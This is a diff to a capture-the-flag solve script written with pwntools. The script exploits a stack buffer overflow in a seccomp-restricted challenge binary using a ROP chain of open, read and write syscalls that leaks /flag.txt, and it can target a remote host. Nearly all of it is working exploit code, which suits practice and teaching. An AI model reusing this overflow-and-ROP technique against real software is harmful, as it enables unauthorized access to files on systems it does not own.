@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # PWN 2 - seccomp ORW.  Works local and remote:
-#   python3 solve.py                                     # local ../public/chall
+#   python3 solve.py                                     # local ../src/chall
 #   python3 solve.py REMOTE HOST=34.1.203.129 PORT=5600
 from pwn import *
 
 context.clear(arch='amd64', os='linux')
-exe = args.BIN or '../public/chall'
+exe = args.BIN or '../src/chall'
 elf = context.binary = ELF(exe, checksec=False)
 
 OFFSET   = 0x48                      # char buf[0x40] + saved rbp
@@ -15,7 +15,6 @@ POP_RDX  = POP_RDI + 4
 POP_RAX  = POP_RDI + 6
 SYSCALL  = POP_RDI + 8
 PATH     = next(elf.search(b'/flag.txt\0'))
-AT_FDCWD = 0xffffffffffffff9c        # -100
 
 io = remote(args.HOST or 'localhost', int(args.PORT or 5600)) if args.REMOTE else process(exe)
 
@@ -32,7 +31,7 @@ def sys(nr, rdi, rsi, rdx):
 
 
 payload  = b'A' * OFFSET
-payload += sys(constants.SYS_openat, AT_FDCWD, PATH, 0)      # -> fd 3
+payload += sys(constants.SYS_open,    PATH, 0, 0)             # -> fd 3
 payload += sys(constants.SYS_read,   3, SCRATCH, 0x80)
 payload += sys(constants.SYS_write,  1, SCRATCH, 0x80)
 payload += sys(constants.SYS_exit_group, 0, 0, 0)            # clean teardown
